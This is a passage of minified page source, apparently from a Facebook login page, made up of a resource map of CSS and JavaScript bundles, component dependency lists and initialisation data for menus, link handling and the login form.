/n":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/l\/0,cross\/xl1P1clHfuW.css?_nc_x=Ij3Wp8lg5Kz"},"CMtjR":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/oV45pEDJLJc.js?_nc_x=Ij3Wp8lg5Kz"},"dHYyK":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iwWx4\/yK\/l\/en_GB\/VusSuwnTbWE.js?_nc_x=Ij3Wp8lg5Kz"},"Fl8Qt":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i3KC4\/ys\/l\/en_GB\/N8PQCjCCR-_.js?_nc_x=Ij3Wp8lg5Kz"},"ozslF":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/FvtDbVzr5yP.js?_nc_x=Ij3Wp8lg5Kz"},"oAM53":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/l\/0,cross\/I4PMQdRYZzH.css?_nc_x=Ij3Wp8lg5Kz"},"6Gphb":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/ROMxm3WFqN1.js?_nc_x=Ij3Wp8lg5Kz"},"hbVQh":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iV0K4\/yl\/l\/en_GB\/nS_Ap-oTlPm.js?_nc_x=Ij3Wp8lg5Kz"},"M7Hmo":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/l\/0,cross\/tmn1WtgC9IZ.css?_nc_x=Ij3Wp8lg5Kz"},"aXM7b":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/kca5BEdlsYj.js?_nc_x=Ij3Wp8lg5Kz"},"N5tzN":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4RE4\/yW\/l\/en_GB\/6rpRN-Wfm2V.js?_nc_x=Ij3Wp8lg5Kz"},"x1NTa":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imXV4\/yG\/l\/en_GB\/mlj6B0BkA-X.js?_nc_x=Ij3Wp8lg5Kz"},"MoAVN":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/r\/UHptZ4kyLOl.js?_nc_x=Ij3Wp8lg5Kz"},"hT1qt":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iZcV4\/yt\/l\/en_GB\/V3S2TuFLifq.js?_nc_x=Ij3Wp8lg5Kz"},"JYhWy":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihM64\/y8\/l\/en_GB\/GBDsifFRJkG.js?_nc_x=Ij3Wp8lg5Kz"},"WQ5Wc":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/r\/b1SYY8m-31-.js?_nc_x=Ij3Wp8lg5Kz"},"SbjqU":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAgG4\/yW\/l\/en_GB\/KKgh2hNA5Gt.js?_nc_x=Ij3Wp8lg5Kz"},"vCzSk":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTMX4\/yc\/l\/en_GB\/KI8ncxtwmmV.js?_nc_x=Ij3Wp8lg5Kz"},"b6vOM":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/l\/0,cross\/4s2GIS25fws.css?_nc_x=Ij3Wp8lg5Kz"},"0yNjH":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yX\/r\/1a8hIHriTO4.js?_nc_x=Ij3Wp8lg5Kz"},"Ta3IG":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/l\/0,cross\/lLqxL6INvDe.css?_nc_x=Ij3Wp8lg5Kz"},"oIvqn":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/l\/0,cross\/dscSPJy99yv.css?_nc_x=Ij3Wp8lg5Kz"},"J2UJx":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/l\/0,cross\/t9rJ8DPTh2r.css?_nc_x=Ij3Wp8lg5Kz"},"8IHy0":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/l\/0,cross\/UUhDvHDiYvJ.css?_nc_x=Ij3Wp8lg5Kz"},"\/+T1Q":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iQPs4\/yY\/l\/en_GB\/_rtZ701ATx9.js?_nc_x=Ij3Wp8lg5Kz"},"FbS7O":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iU7W4\/yL\/l\/en_GB\/hWZ2XfOm3Jc.js?_nc_x=Ij3Wp8lg5Kz"},"yTJOH":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/l\/0,cross\/7tdbkamp04Y.css?_nc_x=Ij3Wp8lg5Kz"},"u3JyI":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNUD4\/yB\/l\/en_GB\/rjF6ljOfsDg.js?_nc_x=Ij3Wp8lg5Kz"},"LS4io":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/cW5iQMJ7fKP.js?_nc_x=Ij3Wp8lg5Kz"},"JXHde":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/l\/0,cross\/Im5MaB0SrGz.css?_nc_x=Ij3Wp8lg5Kz"},"Bq72w":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/te91maqnOEc.js?_nc_x=Ij3Wp8lg5Kz"},"fgw6J":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9Zn4\/yu\/l\/en_GB\/1RfgqZRovxs.js?_nc_x=Ij3Wp8lg5Kz"},"ZwGyk":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iRkI4\/yD\/l\/en_GB\/WAcpiZnelUF.js?_nc_x=Ij3Wp8lg5Kz"},"qBXqT":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idcK4\/y8\/l\/en_GB\/7h8hDB6bREe.js?_nc_x=Ij3Wp8lg5Kz"},"rslQm":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iQ5J4\/yB\/l\/en_GB\/eDC6p5kytg6.js?_nc_x=Ij3Wp8lg5Kz"},"hFeSh":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yv\/l\/en_GB\/XsCLsdJ9DF9.js?_nc_x=Ij3Wp8lg5Kz"},"tyid6":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/iVlQ99C6sU2.js?_nc_x=Ij3Wp8lg5Kz"},"wt1eM":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3it604\/yh\/l\/en_GB\/MS4cmZWkH-s.js?_nc_x=Ij3Wp8lg5Kz"},"Z+IXI":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYgh4\/y1\/l\/en_GB\/ku_lzE4xVtT.js?_nc_x=Ij3Wp8lg5Kz"},"PWqhN":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yN\/r\/DVntKxhvnRB.js?_nc_x=Ij3Wp8lg5Kz"},"y8teq":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iX074\/yi\/l\/en_GB\/Wzhi0DUFl8_.js?_nc_x=Ij3Wp8lg5Kz"},"4VuTu":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/r\/UcaKTW4aqt6.js?_nc_x=Ij3Wp8lg5Kz"},"CrUuo":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/l\/0,cross\/PPfH2_6wwfT.css?_nc_x=Ij3Wp8lg5Kz"},"rDz9q":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iXv24\/y1\/l\/en_GB\/h8Jxx9xpGIz.js?_nc_x=Ij3Wp8lg5Kz"},"mhjRy":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iv6y4\/yS\/l\/en_GB\/afel-Pqet6t.js?_nc_x=Ij3Wp8lg5Kz"},"OCF5K":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i8jc4\/yr\/l\/en_GB\/89hiMhFGMr6.js?_nc_x=Ij3Wp8lg5Kz"},"ha3p3":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/l\/0,cross\/bpaI1hd9_7f.css?_nc_x=Ij3Wp8lg5Kz"},"fr1oK":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ifb94\/yY\/l\/en_GB\/qGGEqKJO5cx.js?_nc_x=Ij3Wp8lg5Kz"},"l6HgQ":{"type":"css","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y-\/l\/0,cross\/Nq8DJolsXpx.css?_nc_x=Ij3Wp8lg5Kz"},"0YPo7":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/KnkzeS-nn8J.js?_nc_x=Ij3Wp8lg5Kz"},"w4fvo":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1MJ4\/y5\/l\/en_GB\/sc-oilm5L9w.js?_nc_x=Ij3Wp8lg5Kz"},"5W+zn":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iJOd4\/yC\/l\/en_GB\/AYR9uzrvSV0.js?_nc_x=Ij3Wp8lg5Kz"},"ZKwG9":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFha4\/y8\/l\/en_GB\/JEMJkzdBIgC.js?_nc_x=Ij3Wp8lg5Kz"},"e2kAh":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iynf4\/y5\/l\/en_GB\/hZHilMBykGN.js?_nc_x=Ij3Wp8lg5Kz"},"tlJkC":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idBq4\/yL\/l\/en_GB\/LnO15fWbxCt.js?_nc_x=Ij3Wp8lg5Kz"},"yv6gj":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i89Q4\/y9\/l\/en_GB\/qKRYqo26aU6.js?_nc_x=Ij3Wp8lg5Kz"},"mLL0T":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/8y65oWUnvgx.js?_nc_x=Ij3Wp8lg5Kz"},"o0p9I":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i-po4\/yk\/l\/en_GB\/I_Yg8Gsz2Fl.js?_nc_x=Ij3Wp8lg5Kz"},"IJ6oK":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iS0S4\/yV\/l\/en_GB\/7ZTtRZ4wqpX.js?_nc_x=Ij3Wp8lg5Kz"},"w6ODA":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/OpYbhSYGsQZ.js?_nc_x=Ij3Wp8lg5Kz"},"f0uca":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/2Fy_lHDbbyJ.js?_nc_x=Ij3Wp8lg5Kz"},"PhrCM":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/QIvfvTLBMxg.js?_nc_x=Ij3Wp8lg5Kz"},"VvVFw":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/weqjNiXubEB.js?_nc_x=Ij3Wp8lg5Kz"},"mEiuV":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/IN-dO8ur0vX.js?_nc_x=Ij3Wp8lg5Kz"},"4\/Kcm":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idBq4\/y7\/l\/en_GB\/RKUSqpKdonJ.js?_nc_x=Ij3Wp8lg5Kz"},"WxQ3g":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/r\/JRxuZTugppW.js?_nc_x=Ij3Wp8lg5Kz"},"AoyP3":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/r\/ySDfr2FLWnT.js?_nc_x=Ij3Wp8lg5Kz"},"LmicE":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/4iSyqlLbVN9.js?_nc_x=Ij3Wp8lg5Kz"},"owb84":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iUjN4\/yI\/l\/en_GB\/dBUsRnruDL-.js?_nc_x=Ij3Wp8lg5Kz"},"5W2Iv":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/Jc7Ux1OS-HN.js?_nc_x=Ij3Wp8lg5Kz"},"ZZIjT":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/r\/RCtYq7ukb3F.js?_nc_x=Ij3Wp8lg5Kz"},"SJElA":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/bD30EXDFr1Q.js?_nc_x=Ij3Wp8lg5Kz"},"P\/mr5":{"type":"css","src":"data:text\/css; charset=utf-8;base64,I2Jvb3Rsb2FkZXJfUF9tcjV7aGVpZ2h0OjQycHg7fS5ib290bG9hZGVyX1BfbXI1e2Rpc3BsYXk6YmxvY2shaW1wb3J0YW50O30=","nc":1,"d":1},"8jSBK":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/YgH8JlvpFFf.js?_nc_x=Ij3Wp8lg5Kz"}},"compMap":{"AsyncRequest":{"r":["FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]}},"Dialog":{"r":["6OhqI","SpABh","zBR\/X","FR6N9","51yTN","8QsxI"],"rds":{"m":["BanzaiODS","FbtLogging","Animation","PageTransitions","BanzaiScuba"],"r":["T0ebq"]},"be":1},"ExceptionDialog":{"r":["6OhqI","6yUkf","KO+fN","zBR\/X","FR6N9","GtxZp"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"QuickSandSolver":{"r":["naYtL","+ClWy","8ELCB","FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"ConfirmationDialog":{"r":["oE4Do","FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"BanzaiODS":{"r":["FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]}},"BanzaiScuba":{"r":["FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]}},"VisualCompletionGating":{"r":["T0ebq","FR6N9","tnai5"],"rds":{"m":["BanzaiODS","BanzaiScuba"]}},"FbtLogging":{"r":["T0ebq"]},"Dock":{"r":["6OhqI","0kAFS","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"WebSpeedInteractionsTypedLogger":{"r":["+9t9o","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"DOM":{"r":["FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"Form":{"r":["FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"FormSubmit":{"r":["FR6N9","Cmm8q","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba","FbtLogging"],"r":["T0ebq"]},"be":1},"Input":{"r":["FR6N9"],"be":1},"Live":{"r":["vtf4W","zBR\/X","FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"Toggler":{"r":["6OhqI","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"Tooltip":{"r":["6OhqI","fmNVq","FR6N9"],"rds":{"m":["BanzaiODS","FbtLogging","PageTransitions","BanzaiScuba","Animation"],"r":["T0ebq","zBR\/X","51yTN","8QsxI"]},"be":1},"URI":{"r":[],"be":1},"trackReferrer":{"r":[],"rds":{"m":["BanzaiODS","BanzaiScuba"],"r":["FR6N9"]},"be":1},"PhotoTagApproval":{"r":["\/mnVq","FR6N9","IERyj","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"PhotoSnowlift":{"r":["zcG6L","6OhqI","h8WFM","YBp\/n","CMtjR","0kAFS","dHYyK","Fl8Qt","fmNVq","KO+fN","ozslF","SpABh","T0ebq","oAM53","6Gphb","zBR\/X","hbVQh","51yTN","M7Hmo","aXM7b","8QsxI","N5tzN","x1NTa","MoAVN","FR6N9","hT1qt","IERyj","JYhWy","WQ5Wc","SbjqU","vCzSk","b6vOM","GtxZp","0yNjH"],"rds":{"m":["Animation","BanzaiODS","BanzaiScuba","VisualCompletionGating","FbtLogging","PageTransitions"],"r":["tnai5"]},"be":1},"PhotoTagger":{"r":["Ta3IG","oIvqn","6OhqI","J2UJx","h8WFM","CMtjR","8IHy0","0kAFS","\/+T1Q","FbS7O","Q\/kbd","yTJOH","u3JyI","6yUkf","fmNVq","LS4io","JXHde","KO+fN","SpABh","T0ebq","Bq72w","fgw6J","ZwGyk","oAM53","qBXqT","rslQm","hFeSh","tyid6","wt1eM","zBR\/X","Z+IXI","PWqhN","y8teq","4VuTu","aXM7b","8QsxI","CrUuo","rDz9q","N5tzN","MoAVN","FR6N9","mhjRy","IERyj","WQ5Wc","SbjqU","OCF5K","vCzSk","ha3p3","fr1oK","l6HgQ","0YPo7","GtxZp","w4fvo","5W+zn","ZKwG9","e2kAh","51yTN","7f1P8"],"rdfds":{"m":["GamesVideoDeleteCommentDialog.react","GamesVideoModerationRulesNux.react","GamesVideoCommentRemovedDialog.react"],"r":["tlJkC","Fl8Qt","ozslF","yv6gj"]},"rds":{"m":["PresenceStatus","Animation","BanzaiODS","BanzaiScuba","FbtLogging","PageTransitions","Banzai","LynxAsyncCallbackFalcoEvent"],"r":["mLL0T"]},"be":1},"PhotoTags":{"r":["\/mnVq","FR6N9","IERyj","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"TagTokenizer":{"r":["6OhqI","\/mnVq","o0p9I","FR6N9","IJ6oK","tnai5"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"AsyncDialog":{"r":["6OhqI","KO+fN","FR6N9"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"Hovercard":{"r":["6OhqI","fmNVq","JXHde","hFeSh","zBR\/X","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba","FbtLogging","PageTransitions","Animation"],"r":["T0ebq","51yTN","8QsxI"]},"be":1},"XSalesPromoWWWDetailsDialogAsyncController":{"r":["w6ODA"],"be":1},"XOfferController":{"r":["f0uca"],"be":1},"PerfXSharedFields":{"r":["FR6N9"],"be":1},"KeyEventTypedLogger":{"r":["PhrCM","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"QPLInspector":{"r":["VvVFw"],"be":1},"BladeRunnerClient":{"r":["mEiuV","4\/Kcm","FR6N9","GtxZp"],"rds":{"m":["BanzaiODS","BanzaiScuba","MqttLongPollingRunner"],"r":["T0ebq","WxQ3g"]},"be":1},"BladeRunnerStreamHandler":{"r":["FR6N9"],"be":1},"WebSession":{"r":[],"rds":{"m":["BanzaiODS","BanzaiScuba"],"r":["FR6N9"]},"be":1},"FalcoBladeRunnerTransport":{"r":["AoyP3"],"be":1},"ReactDOM":{"r":["FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"Animation":{"r":["FR6N9","6OhqI"],"rds":{"m":["BanzaiODS","BanzaiScuba"]}},"PageTransitions":{"r":["zBR\/X","51yTN","8QsxI","FR6N9","6OhqI"],"rds":{"m":["Animation","PageTransitions","BanzaiODS","BanzaiScuba","FbtLogging"],"r":["T0ebq"]}},"ContextualLayerInlineTabOrder":{"r":["6OhqI","hFeSh","FR6N9","OCF5K"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"XUIDialogButton.react":{"r":["6OhqI","KO+fN","FR6N9"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"XUIDialogBody.react":{"r":["6OhqI","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"XUIDialogFooter.react":{"r":["6OhqI","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"XUIDialogTitle.react":{"r":["6OhqI","KO+fN","FR6N9"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"XUIGrayText.react":{"r":["6OhqI","zBR\/X","FR6N9"],"rds":{"m":["BanzaiODS","BanzaiScuba"]},"be":1},"DialogX":{"r":["6OhqI","FR6N9"],"rds":{"m":["BanzaiODS","FbtLogging","BanzaiScuba"],"r":["T0ebq"]},"be":1},"React":{"r":["FR6N9"],"be":1}}})});
</script>

<script>requireLazy(["InitialJSLoader"], function(InitialJSLoader) {InitialJSLoader.loadOnDOMContentReady(["LmicE","T0ebq","tnai5","zBR\/X","0kAFS","Z+IXI","FR6N9","owb84","8QsxI","OCF5K","5W2Iv","KO+fN","ZZIjT","SJElA","GtxZp","fmNVq","51yTN","8jSBK","P\/mr5"]);});
</script>

<script>requireLazy(["TimeSliceImpl","ServerJS"],function(TimeSlice,ServerJS){var s=(new ServerJS());s.handle({"define":[["LinkshimHandlerConfig",[],{"supports_meta_referrer":true,"default_meta_referrer_policy":"origin-when-crossorigin","switched_meta_referrer_policy":"origin","non_linkshim_lnfb_mode":null,"link_react_default_hash":"AT1uHmruZ14NZ5SQqz-N0cR6wbZNagILkpguP4L7JBfsXKNzMkdyVYd4Zz_AuHyUUom7-MlTOBtvvftNIZUYB5hv1mplbn6HkRLueOVRjryT-LXqOwg88RRQST4NHJS0ONMVmV3tX4NBHXyG3UHJq1NApD6znA","untrusted_link_default_hash":"AT0ckopslHtoVmX7awbUaLH15GSTDvtNpoTBXIlyHPFoPF5Fyw6QsSDvcSjd2zSJ4wKf_O4ufzohYeKNLROeqDtaxxchHZpWF-xsyljaHOKUrY7glkN3DvyvNwqVJjMBwO2g9CkEDIi_zBH56hNYz5WnsBFVug","linkshim_host":"l.facebook.com","use_rel_no_opener":true,"always_use_https":true,"onion_always_shim":true,"middle_click_requires_event":true,"www_safe_js_mode":"asynclazy","m_safe_js_mode":"MLynx_asynclazy","ghl_param_link_shim":false,"click_ids":[],"is_linkshim_supported":true,"current_domain":"facebook.com"},27]],"instances":[["__inst_5b4d0c00_0_0",["Menu","XUIMenuWithSquareCorner","XUIMenuTheme"],[[],{"id":"u_0_0","behaviors":[{"__m":"XUIMenuWithSquareCorner"}],"theme":{"__m":"XUIMenuTheme"}}],2],["__inst_5b4d0c00_0_1",["Menu","MenuItem","__markup_3310c079_0_0","HTML","__markup_3310c079_0_1","__markup_3310c079_0_2","__markup_3310c079_0_3","XUIMenuWithSquareCorner","XUIMenuTheme"],[[{"value":"key_shortcuts","ctor":{"__m":"MenuItem"},"markup":{"__m":"__markup_3310c079_0_0"},"label":"Keyboard shortcut help...","title":"","className":null},{"href":"\/help\/accessibility","target":"_blank","value":"help_center","ctor":{"__m":"MenuItem"},"markup":{"__m":"__markup_3310c079_0_1"},"label":"Accessibility Help Centre","title":"","className":null},{"href":"\/help\/contact\/accessibility","target":"_blank","value":"submit_feedback","ctor":{"__m":"MenuItem"},"markup":{"__m":"__markup_3310c079_0_2"},"label":"Submit feedback","title":"","className":null},{"href":"\/accessibility","target":"_blank","value":"facebook_page","ctor":{"__m":"MenuItem"},"markup":{"__m":"__markup_3310c079_0_3"},"label":"Updates from Facebook Accessibility","title":"","className":null}],{"id":"u_0_1","behaviors":[{"__m":"XUIMenuWithSquareCorner"}],"theme":{"__m":"XUIMenuTheme"}}],2],["__inst_e5ad243d_0_0",["PopoverMenu","__inst_1de146dc_0_1","__elem_ec77afbd_0_1","__inst_5b4d0c00_0_1"],[{"__m":"__inst_1de146dc_0_1"},{"__m":"__elem_ec77afbd_0_1"},{"__m":"__inst_5b4d0c00_0_1"},[]],2],["__inst_e5ad243d_0_1",["PopoverMenu","__inst_1de146dc_0_0","__elem_ec77afbd_0_0","__inst_5b4d0c00_0_0"],[{"__m":"__inst_1de146dc_0_0"},{"__m":"__elem_ec77afbd_0_0"},{"__m":"__inst_5b4d0c00_0_0"},[]],2],["__inst_1de146dc_0_0",["Popover","__elem_1de146dc_0_0","__elem_ec77afbd_0_0","ContextualLayerAutoFlip","ContextualDialogArrow"],[{"__m":"__elem_1de146dc_0_0"},{"__m":"__elem_ec77afbd_0_0"},[{"__m":"ContextualLayerAutoFlip"},{"__m":"ContextualDialogArrow"}],{"alignh":"left","position":"below"}],2],["__inst_1de146dc_0_1",["Popover","__elem_1de146dc_0_1","__elem_ec77afbd_0_1","ContextualLayerAutoFlip","ContextualDialogArrow"],[{"__m":"__elem_1de146dc_0_1"},{"__m":"__elem_ec77afbd_0_1"},[{"__m":"ContextualLayerAutoFlip"},{"__m":"ContextualDialogArrow"}],{"alignh":"right","position":"below"}],2]],"markup":[["__markup_3310c079_0_0",{"__html":"Keyboard shortcut help..."},1],["__markup_3310c079_0_1",{"__html":"Accessibility Help Centre"},1],["__markup_3310c079_0_2",{"__html":"Submit feedback"},1],["__markup_3310c079_0_3",{"__html":"Updates from Facebook Accessibility"},1]],"elements":[["__elem_a588f507_0_1","u_0_2",1],["__elem_3fc3da18_0_0","u_0_3",1],["__elem_51be6cb7_0_0","u_0_4",1],["__elem_1de146dc_0_0","u_0_5",1],["__elem_ec77afbd_0_0","u_0_6",2],["__elem_1de146dc_0_1","u_0_7",1],["__elem_ec77afbd_0_1","u_0_8",2],["__elem_a588f507_0_0","globalContainer",2],["__elem_a588f507_0_2","content",1],["__elem_835c633a_0_0","login_form",2],["__elem_f46f4946_0_0","u_0_9",1],["__elem_f46f4946_0_1","u_0_a",1],["__elem_45d73b5d_0_0","loginbutton",1]],"require":[["ServiceWorkerLoginAndLogout","login",[],[]],["WebPixelRatioDetector","startDetecting",[],[false]],["ScriptPath","set",[],["WebLoginPageController","01afab33",{"imp_id":"0PNsmn2Wr4nVvfG5U","ef_page":null,"uri":"https:\/\/www.facebook.com\/login\/"}]],["UITinyViewportAction","init",[],[]],["ResetScrollOnUnload","init",["__elem_a588f507_0_0"],[{"__m":"__elem_a588f507_0_0"}]],["AccessibilityWebVirtualCursorClickLogger","init",["__elem_a588f507_0_0"],[[{"__m":"__elem_a588f507_0_0"}]]],["KeyboardActivityLogger","init",[],[]],["FocusRing","init",[],[]],["ErrorMessageConsole","listenForUncaughtErrors",[],[]],["HardwareCSS","init",[],[]],["NavigationAssistantController","init",["__elem_3fc3da18_0_0","__elem_51be6cb7_0_0","__inst_5b4d0c00_0_0","__inst_5b4d0c00_0_1","__inst_e5ad243d_0_0","__inst_e5ad243d_0_1"],[{"__m":"__elem_3fc3da18_0_0"},{"__m":"__elem_51be6cb7_0_0"},{"__m":"__inst_5b4d0c00_0_0"},{"__m":"__inst_5b4d0c00_0_1"},null,{"accessibilityPopoverMenu":{"__m":"__inst_e5ad243d_0_0"},"globalPopoverMenu":null,"sectionsPopoverMenu":{"__m":"__inst_e5ad243d_0_1"}}]],["__inst_e5ad243d_0_1"],["__inst_1de146dc_0_0"],["__inst_e5ad243d_0_0"],["__inst_1de146dc_0_1"],["TimezoneAutoset","setInputValue",["__elem_f46f4946_0_0"],[{"__m":"__elem_f46f4946_0_0"},1602394768]],["ScreenDimensionsAutoSet","setInputValue",["__elem_f46f4946_0_1"],[{"__m":"__elem_f46f4946_0_1"}]],["LoginFormController","init",["__elem_835c633a_0_0","__elem_45d73b5d_0_0"],[{"__m":"__elem_835c633a_0_0"},{"__m":"__elem_45d73b5d_0_0"},null,true,{"pubKey":{"publicKey":"247e6686795c0541c1f27374faa7f9a92e4bc2c151f6635a2c9cc6ac34a9eb23","keyId":225}}]],["PlatformDialogCBTSetter","setCBTInFormAndLog",["__elem_835c633a_0_0"],[{"__m":"__elem_835c633a_0_0"},"client_logged_out_init_impression"]],["BrowserPrefillLogging","initPasswordFieldLogging",[],[{"passwordFieldID":"pass"}]],["FocusListener"],["FlipDirectionOnKeypress"],["IntlUtils"],["FBLynx","setupDelegation",[],[]],["Animation"],["PageTransitions"],["Bootloader","markComponentsAsImmediate",[],[["BanzaiODS","BanzaiScuba","Animation","FbtLogging","PageTransitions"]]],["TimeSliceImpl"],["HasteSupportData"],["ServerJS"],["Run"],["InitialJSLoader"]],"contexts":[[{"__m":"__elem_a588f507_0_1"},true],[{"__m":"__elem_a588f507_0_2"},true]]});requireLazy(["Run"],function(Run){Run.onAfterLoad(function(){s.cleanup(TimeSlic